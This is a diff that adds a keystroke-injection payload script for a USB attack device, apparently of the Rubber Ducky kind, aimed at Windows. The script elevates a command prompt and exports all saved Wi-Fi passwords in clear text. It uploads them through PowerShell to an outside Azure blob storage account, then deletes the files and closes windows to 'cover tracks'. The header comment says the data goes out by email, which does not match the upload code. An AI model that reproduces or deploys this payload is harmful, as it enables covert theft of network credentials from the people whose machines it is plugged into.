@@ -1,0 +1,112 @@
+REM The following script will allow us to obtain network names and wifi passwords and export them via email
+DELAY 5000
+CONTROL ESCAPE
+DELAY 500
+STRING CMD
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
+DELAY 1000
+CONTROL c
+DELAY 100
+STRING cd/
+DELAY 300
+ENTER
+DELAY 100
+REM make a directory to export the network profiles to
+STRING mkdir wifi
+DELAY 100
+ENTER
+DELAY 100
+STRING cd wifi
+DELAY 100
+ENTER
+DELAY 100
+REM this command will export the profiles with the passwords in clear text
+REM each profile will be exported to a seperate .xml file, the files will be concatanated later in script
+STRING netsh wlan export profile key=clear
+DELAY 200
+ENTER
+DELAY 1000
+REM this command will copy all the .xml files to one .txt file that we can export
+STRING copy *.xml wifi.txt
+DELAY 200
+ENTER
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
+DELAY 500
+REM exit out of administrative command prompt to cover tracks
+CONTROL ESCAPE
+DELAY 100
+REM opens powershell for use of command line emailing
+STRING Powershell
+DELAY 100
+ENTER
+DELAY 1000
+REM Ensure TLS version is set to 1.2
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+DELAY 100
+ENTER
+DELAY 500
+REM Setting variables for the REST API and sending the file to Azure
+STRING $file = "C:\wifi\wifi.txt"
+DELAY 100
+ENTER
+DELAY 200 
+STRING $blobname = "<name of azure storage account>"
+DELAY 100
+ENTER
+DELAY 200 
+STRING $sastoken = "<sas token for blob after '?'>"
+DELAY 100
+ENTER
+DELAY 200
+STRING $rnumber = Get-Random -Minimum 1000 -Maximum 9999
+DELAY 100
+ENTER
+DELAY 200
+STRING $name = (Get-Item $file).Name
+DELAY 100
+ENTER
+DELAY 200
+STRING $newname = "$rnumber-$name"
+DELAY 100
+ENTER
+DELAY 200
+STRING $uri = "https://$($blobname).blob.core.windows.net/wifi/$($newname)?$($sastoken)"
+DELAY 100
+ENTER
+DELAY 200
+REM Upload file to Azure Blob
+STRING Invoke-RestMethod -Uri $uri -Method Put -Headers @{'x-ms-blob-type' = 'BlockBlob'} -InFile $file
+DELAY 200
+ENTER
+DELAY 1000
+STRING exit
+DELAY 100
+ENTER
+DELAY 300
+REM exit out of powershell to cover tracks
+CONTROL ESCAPE
+DELAY 150
+STRING CMD
+DELAY 100
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
+DELAY 2000
+STRING cd/
+DELAY 300
+ENTER
+DELAY 100
+REM Remove directoy and file
+STRING rmdir /Q /S wifi
+DELAY 100
+ENTER
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
